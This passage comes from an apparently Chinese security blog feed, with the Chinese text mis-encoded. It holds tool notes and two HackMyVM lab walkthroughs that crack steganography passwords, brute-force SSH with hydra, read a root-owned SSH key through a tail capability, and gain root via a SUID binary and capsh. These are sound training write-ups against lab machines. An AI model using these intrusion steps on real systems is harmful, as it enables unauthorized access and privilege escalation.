href="http://archive.debian.org/debian/pool/main/libm/libmcrypt/libmcrypt4_2.5.8-3.4_amd64.deb">http://archive.debian.org/debian/pool/main/libm/libmcrypt/libmcrypt4_2.5.8-3.4_amd64.deb</a><br>sudo dpkg -i libmhash2_0.9.9.9-7+b1_amd64.deb<br>sudo dpkg -i libmcrypt4_2.5.8-3.4_amd64.deb</p><p>stegseek -wl &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt cat-hidden.jpg </p><table><thead><tr><th>å‚æ•°</th><th>ä½œç”¨</th><th></th></tr></thead><tbody><tr><td>-wl</td><td>æŒ‡å®šå­—å…¸çˆ†ç ´å¯†ç </td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h2 id="4-dig"><a href="#4-dig" class="headerlink" title="4.dig"></a>4.dig</h2><p><code>dig</code>ï¼ˆDomain Information Groperï¼‰æ˜¯ä¸€ä¸ªDNS æŸ¥è¯¢å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig [@DNSæœåŠ¡å™¨] [åŸŸå] [è®°å½•ç±»å‹] [å‚æ•°...]</span><br></pre></td></tr></table></figure><table><thead><tr><th>ç±»å‹</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>A</td><td>ä¸»æœºåœ°å€ï¼ˆIPv4ï¼‰</td></tr><tr><td>AAAA</td><td>ä¸»æœºåœ°å€ï¼ˆIPv6ï¼‰</td></tr><tr><td>MX</td><td>é‚®ä»¶æœåŠ¡å™¨è®°å½•</td></tr><tr><td>NS</td><td>æˆæƒåç§°æœåŠ¡å™¨</td></tr><tr><td>CNAME</td><td>è§„èŒƒåç§°ï¼ˆåˆ«åï¼‰</td></tr><tr><td>TXT</td><td>æ–‡æœ¬è®°å½•ï¼ˆSPF&#x2F;éªŒè¯ä¿¡æ¯ï¼‰</td></tr><tr><td>SOA</td><td>Start of Authorityï¼ˆèµ·å§‹æƒå¨ï¼‰</td></tr><tr><td>AXFR</td><td>åŒºåŸŸä¼ é€ï¼ˆZone Transferï¼‰</td></tr></tbody></table><table><thead><tr><th>å‚æ•°</th><th>åŠŸèƒ½è¯´æ˜</th></tr></thead><tbody><tr><td><code>+short</code></td><td>åªæ˜¾ç¤ºç®€æ´çš„ç­”æ¡ˆï¼ˆæ¯”å¦‚ IP åœ°å€ï¼‰</td></tr><tr><td><code>+tcp</code></td><td>ä½¿ç”¨ TCP åè®®ï¼ˆâš ï¸AXFR å¿…é¡»ä½¿ç”¨ TCPï¼‰</td></tr><tr><td><code>+noquestion</code></td><td>ä¸æ˜¾ç¤ºæŸ¥è¯¢é—®é¢˜éƒ¨åˆ†ï¼ˆè¯·æ±‚è¡Œï¼‰</td></tr><tr><td><code>+nocomments</code></td><td>ä¸æ˜¾ç¤ºæ³¨é‡Š</td></tr><tr><td><code>+nostats</code></td><td>ä¸æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯</td></tr><tr><td><code>+nocmd</code></td><td>ä¸æ˜¾ç¤ºå‘½ä»¤æç¤ºå¤´</td></tr><tr><td><code>+multiline</code></td><td>ç¾åŒ–è¾“å‡ºæ ¼å¼ï¼Œå¤šè¡Œå±•ç¤º</td></tr><tr><td><code>+trace</code></td><td>å¯ç”¨è·Ÿè¸ªæ¨¡å¼ï¼Œä»æ ¹æœåŠ¡å™¨é€çº§æŸ¥è¯¢åŸŸå</td></tr></tbody></table><h2 id="5-searchsploit"><a href="#5-searchsploit" class="headerlink" title="5.searchsploit"></a>5.searchsploit</h2><p><code>searchsploit</code> æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºåœ¨æœ¬åœ°å¿«é€Ÿæœç´¢ <strong>Exploit Database</strong> ä¸­å·²çŸ¥çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼ˆPoCï¼‰å’Œæ¼æ´ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit wp-file-manager</span><br><span class="line"></span><br><span class="line">searchsploit -m php/webapps/51224.py</span><br></pre></td></tr></table></figure><table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>-u</code></td><td>æ›´æ–°æœ¬åœ°æ•°æ®åº“ï¼ˆç›¸å½“äº <code>git pull</code>ï¼‰</td></tr><tr><td><code>-p</code></td><td>æ˜¾ç¤º Exploit çš„å®Œæ•´è·¯å¾„</td></tr><tr><td><code>-x &lt;è·¯å¾„&gt;</code></td><td>ç›´æ¥æ˜¾ç¤º PoC æ–‡ä»¶å†…å®¹</td></tr><tr><td><code>-m &lt;è·¯å¾„&gt;</code></td><td>å¤åˆ¶ PoC åˆ°å½“å‰ç›®å½•</td></tr><tr><td><code>--json</code></td><td>è¾“å‡ºä¸º JSON æ ¼å¼ï¼Œä¾¿äºè„šæœ¬å¤„ç†</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-Twisted</title>
      <link href="/2025/07/02/hackmyvm-Twisted/"/>
      <url>/2025/07/02/hackmyvm-Twisted/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.104</span><br><span class="line">80/tcp   open  http    nginx 1.14.2</span><br><span class="line">2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2</span><br></pre></td></tr></table></figure><h2 id="äºŒã€Web-åˆ†æï¼ˆç«¯å£-80ï¼‰"><a href="#äºŒã€Web-åˆ†æï¼ˆç«¯å£-80ï¼‰" class="headerlink" title="äºŒã€Web åˆ†æï¼ˆç«¯å£ 80ï¼‰"></a>äºŒã€Web åˆ†æï¼ˆç«¯å£ 80ï¼‰</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.56.104</span><br></pre></td></tr></table></figure><p>è¿”å›é¡µé¢å†…å®¹æç¤ºå¯¹ä¸¤å¼ å›¾ç‰‡è¿›è¡Œæ¯”è¾ƒï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>I love cats!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;cat-original.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cat original&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>But I prefer this one because seems different<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;cat-hidden.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cat Hidden&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>å°è¯• stegsolve å’Œ 010 Editorç­‰åå»çœ‹å¤§ä½¬wpï¼Œç”¨ stegseekï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">stegseek -wl /usr/share/wordlists/rockyou.txt cat-hidden.jpg  </span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line">[i] Found passphrase: <span class="string">&quot;sexymama&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;mateo.txt&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;cat-hidden.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">stegseek -wl /usr/share/wordlists/rockyou.txt cat-original.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line">[i] Found passphrase: <span class="string">&quot;westlife&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;markus.txt&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;cat-original.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> cat-hidden.jpg.out </span><br><span class="line">thisismypassword</span><br><span class="line"><span class="built_in">cat</span> cat-original.jpg.out</span><br><span class="line">markuslovesbonita</span><br></pre></td></tr></table></figure><p>çŒœæµ‹ç–‘ä¼¼çš„ç”¨æˆ·ä¸å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mateo</span><br><span class="line">markus</span><br><span class="line">bonita</span><br><span class="line">thisismypassword</span><br><span class="line">markuslovesbonita</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€çˆ†ç ´-SSH-ç™»å½•"><a href="#ä¸‰ã€çˆ†ç ´-SSH-ç™»å½•" class="headerlink" title="ä¸‰ã€çˆ†ç ´ SSH ç™»å½•"></a>ä¸‰ã€çˆ†ç ´ SSH ç™»å½•</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L up.txt -p up.txt ssh://192.168.56.104:2222 -V</span><br><span class="line">[2222][ssh] host: 192.168.56.104   login: markus   password: markuslovesbonita</span><br><span class="line">[2222][ssh] host: 192.168.56.104   login: mateo   password: thisismypassword</span><br></pre></td></tr></table></figure><h2 id="å››ã€æœ¬åœ°ä¿¡æ¯æ¢æµ‹"><a href="#å››ã€æœ¬åœ°ä¿¡æ¯æ¢æµ‹" class="headerlink" title="å››ã€æœ¬åœ°ä¿¡æ¯æ¢æµ‹"></a>å››ã€æœ¬åœ°ä¿¡æ¯æ¢æµ‹</h2><p>ç™»å½•åæŸ¥çœ‹ note.txtï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hi bonita,</span><br><span class="line">I have saved your id_rsa here: /var/cache/apt/id_rsa</span><br><span class="line">Nobody can find it.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /var/cache/apt/id_rsa</span><br><span class="line">-rw------- 1 root root     1823 Oct 14  2020 id_rsa</span><br></pre></td></tr></table></figure><h2 id="äº”ã€æŸ¥æ‰¾-Capability-æƒé™"><a href="#äº”ã€æŸ¥æ‰¾-Capability-æƒé™" class="headerlink" title="äº”ã€æŸ¥æ‰¾ Capability æƒé™"></a>äº”ã€æŸ¥æ‰¾ Capability æƒé™</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/getcap / -r 2&gt;/dev/null</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/usr/bin/tail = cap_dac_read_search+ep</span><br></pre></td></tr></table></figure><p><code>tail</code> å¯ä»¥ä»¥rootæƒé™è¯»å–ä»»æ„æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/tail -n +1 /var/cache/apt/id_rsa</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa bonita@192.168.56.104 -p 2222</span><br></pre></td></tr></table></figure><h2 id="å…­ã€æœ¬åœ°ææƒï¼ˆSUIDï¼‰"><a href="#å…­ã€æœ¬åœ°ææƒï¼ˆSUIDï¼‰" class="headerlink" title="å…­ã€æœ¬åœ°ææƒï¼ˆSUIDï¼‰"></a>å…­ã€æœ¬åœ°ææƒï¼ˆSUIDï¼‰</h2><p>bonita ç”¨æˆ·ç›®å½•ä¸‹å‘ç° suid æ–‡ä»¶ï¼š<code>beroot</code></p><p>è¿è¡Œåæç¤ºè¾“å…¥ codeï¼Œä½¿ç”¨idaé™æ€åˆ†æå¾—çŸ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n5880; <span class="comment">// [rsp+1Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the code:\n &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%i&quot;</span>, &amp;n5880);</span><br><span class="line">  <span class="keyword">if</span> ( n5880 == <span class="number">5880</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nWRONG&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥è¾“å…¥ <code>5880</code> å³å¯è·å¾— rootï¼š</p><h2 id="ä¸ƒã€æ€»ç»“"><a href="#ä¸ƒã€æ€»ç»“" class="headerlink" title="ä¸ƒã€æ€»ç»“"></a>ä¸ƒã€æ€»ç»“</h2><ul><li>stegseekï¼ˆçˆ†ç ´ JPEG éšå†™ï¼‰</li><li>getcapæŸ¥çœ‹Capability æƒé™å‘½ä»¤</li></ul>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶æœº </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-alzheimer</title>
      <link href="/2025/07/01/hackmyvm-alzheimer/"/>
      <url>/2025/07/01/hackmyvm-alzheimer/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†é˜¶æ®µ"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†é˜¶æ®µ" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†é˜¶æ®µ"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†é˜¶æ®µ</h2><p>ä½¿ç”¨ <code>nmap</code> è¿›è¡ŒåŸºç¡€æœåŠ¡æ‰«æï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.101</span><br><span class="line">21/tcp open     ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp filtered http</span><br></pre></td></tr></table></figure><p>ä»… 21 ç«¯å£å¼€æ”¾ï¼Œ22 ä¸ 80 è¢«é˜²ç«å¢™è¿‡æ»¤ã€‚</p><h2 id="äºŒã€FTP-åŒ¿åè®¿é—®"><a href="#äºŒã€FTP-åŒ¿åè®¿é—®" class="headerlink" title="äºŒã€FTP åŒ¿åè®¿é—®"></a>äºŒã€FTP åŒ¿åè®¿é—®</h2><p>å°è¯•åŒ¿åç™»å½• FTPï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>anonymous</code> ç”¨æˆ·æˆåŠŸç™»å½•ï¼Œåˆ—å‡ºæ–‡ä»¶åå‘ç°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.secretnote.txt</span><br></pre></td></tr></table></figure><p>è¯»å–è¯¥æ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> .secretnote.txt</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I need to knock this ports and </span><br><span class="line">one door will be open!</span><br><span class="line">1000</span><br><span class="line">2000</span><br><span class="line">3000</span><br></pre></td></tr></table></figure><blockquote><p>ğŸ’¡ åˆ¤æ–­ä¸ºç«¯å£æ•²é—¨ï¼ˆPort Knockingï¼‰æœºåˆ¶ â€”â€” æŒ‰é¡ºåºè®¿é—®æŒ‡å®šç«¯å£åä¼šè§¦å‘æœåŠ¡å¼€æ”¾ã€‚</p></blockquote><hr><h2 id="ä¸‰ã€è§¦å‘ç«¯å£æ•²é—¨"><a href="#ä¸‰ã€è§¦å‘ç«¯å£æ•²é—¨" class="headerlink" title="ä¸‰ã€è§¦å‘ç«¯å£æ•²é—¨"></a>ä¸‰ã€è§¦å‘ç«¯å£æ•²é—¨</h2><p>ä½¿ç”¨ <code>nmap</code> æ¨¡æ‹Ÿè®¿é—®æŒ‡å®šç«¯å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --host-timeout 201 --max-retries 0 -p 1000,2000,3000 192.168.56.101</span><br><span class="line"><span class="comment">#æˆ–è€…</span></span><br><span class="line"><span class="comment">#knock 192.168.56.101 1000 2000 3000</span></span><br></pre></td></tr></table></figure><p>å†æ¬¡æ‰«æå¼€æ”¾ç«¯å£ï¼Œå‘ç° SSH ä¸ HTTP å·²å¼€æ”¾ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.101</span><br></pre></td></tr></table></figure><p>æ‰«æç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br></pre></td></tr></table></figure><hr><h2 id="å››ã€Web-ä¿¡æ¯æœé›†"><a href="#å››ã€Web-ä¿¡æ¯æœé›†" class="headerlink" title="å››ã€Web ä¿¡æ¯æœé›†"></a>å››ã€Web ä¿¡æ¯æœé›†</h2><p>è®¿é—®é¦–é¡µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.101</span><br></pre></td></tr></table></figure><p>è¿”å›å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I dont remember where I stored my password :(</span><br><span class="line">I only remember that was into a .txt file...</span><br><span class="line">-medusa</span><br><span class="line"></span><br><span class="line">&lt;!---. --- - .... .. -. --. --&gt;</span><br></pre></td></tr></table></figure><ul><li>å¯ç–‘ç”¨æˆ·åï¼š<code>medusa</code></li><li>é¡µé¢éšè—æ‘©æ–¯å¯†ç ï¼š<code>--- --- - .... .. -. --.</code> è§£ç ä¸º â€œnothingâ€</li></ul><hr><h2 id="äº”ã€ç›®å½•æ‰«æ"><a href="#äº”ã€ç›®å½•æ‰«æ" class="headerlink" title="äº”ã€ç›®å½•æ‰«æ"></a>äº”ã€ç›®å½•æ‰«æ</h2><p>å¯¹ Web æœåŠ¡è¿›è¡Œç›®å½•çˆ†ç ´ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40</span><br></pre></td></tr></table></figure><p>å‘ç°è·¯å¾„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin</span><br><span class="line">/home</span><br><span class="line">/secret</span><br></pre></td></tr></table></figure><p>ä½†è¿™äº›ç›®å½•ä¸­çš„å†…å®¹å¤šä¸ºè¿·æƒ‘ä¿¡æ¯ï¼Œæ— æ˜¾è‘—çªç ´ã€‚</p><hr><h2 id="å…­ã€å›åˆ°-FTPï¼Œæ–‡ä»¶å‘ç”Ÿå˜åŒ–"><a href="#å…­ã€å›åˆ°-FTPï¼Œæ–‡ä»¶å‘ç”Ÿå˜åŒ–" class="headerlink" title="å…­ã€å›åˆ° FTPï¼Œæ–‡ä»¶å‘ç”Ÿå˜åŒ–"></a>å…­ã€å›åˆ° FTPï¼Œæ–‡ä»¶å‘ç”Ÿå˜åŒ–</h2><p>é‡æ–°è¿æ¥ FTPï¼Œå‘ç° <code>.secretnote.txt</code> å†…å®¹å‘ç”Ÿäº†å˜åŒ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">I need to knock this ports and </span><br><span class="line">one door will be open!</span><br><span class="line">1000</span><br><span class="line">2000</span><br><span class="line">3000</span><br><span class="line">Ihavebeenalwayshere!!!</span><br></pre></td></tr></table></figure><p>æ¨æµ‹ä¸ºæç¤ºæˆ‘ä»¬å·²å®Œæˆæ•²é—¨ï¼ŒæœåŠ¡å…¨éƒ¨å¼€æ”¾ï¼Œä¸‹ä¸€æ­¥å¯ç™»å½• SSHã€‚</p><hr><h2 id="ä¸ƒã€SSH-ç™»å½•ä¸ææƒ"><a href="#ä¸ƒã€SSH-ç™»å½•ä¸ææƒ" class="headerlink" title="ä¸ƒã€SSH ç™»å½•ä¸ææƒ"></a>ä¸ƒã€SSH ç™»å½•ä¸ææƒ</h2><p>ä½¿ç”¨ç”¨æˆ·å <code>medusa</code> å’Œå¯†ç ç™»å½• SSHï¼ˆå¯†ç æ¨æµ‹æ¥æºäº FTP æˆ–ç«™ç‚¹ä¿¡æ¯ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh medusa@192.168.56.101</span><br></pre></td></tr></table></figure><h3 id="7-1-sudo-æƒé™æšä¸¾"><a href="#7-1-sudo-æƒé™æšä¸¾" class="headerlink" title="7.1 sudo æƒé™æšä¸¾"></a>7.1 sudo æƒé™æšä¸¾</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure><p>å‘ç°å¯æ‰§è¡Œ <code>/bin/id</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL) NOPASSWD: /bin/id</span><br></pre></td></tr></table></figure><p>æ— æ˜æ˜¾ææƒçªç ´ï¼Œç»§ç»­å¯»æ‰¾ SUID ç¨‹åºã€‚</p><h3 id="7-2-æŸ¥æ‰¾-SUID-ç¨‹åº"><a href="#7-2-æŸ¥æ‰¾-SUID-ç¨‹åº" class="headerlink" title="7.2 æŸ¥æ‰¾ SUID ç¨‹åº"></a>7.2 æŸ¥æ‰¾ SUID ç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>å‘ç°å…³é”®ææƒç‚¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/capsh</span><br></pre></td></tr></table></figure><p>è¯¥ç¨‹åºæ”¯æŒé€šè¿‡ <code>--uid=0 --gid=0</code> ææƒï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/capsh --gid=0 --uid=0 --</span><br></pre></td></tr></table></figure><p>è·å– <code>root</code> shellï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>æˆåŠŸææƒã€‚</p><hr><h2 id="å…«ã€æ€»ç»“"><a href="#å…«ã€æ€»ç»“" class="headerlink" title="å…«ã€æ€»ç»“"></a>å…«ã€æ€»ç»“</h2><ul><li>åˆ©ç”¨äº† FTP åŒ¿åè®¿é—®å‘ç°æ•²é—¨ä¿¡æ¯</li><li>æ¨¡æ‹Ÿæ•²é—¨æˆåŠŸå¼€æ”¾è¢«è¿‡æ»¤ç«¯å£</li><li>åˆ©ç”¨å­˜åœ¨çš„ SUID ç¨‹åº capsh æˆåŠŸææƒä¸º root</li></ul>]]></content>
      
      
      <categories>
          
          <category> é¶æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶æœº </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
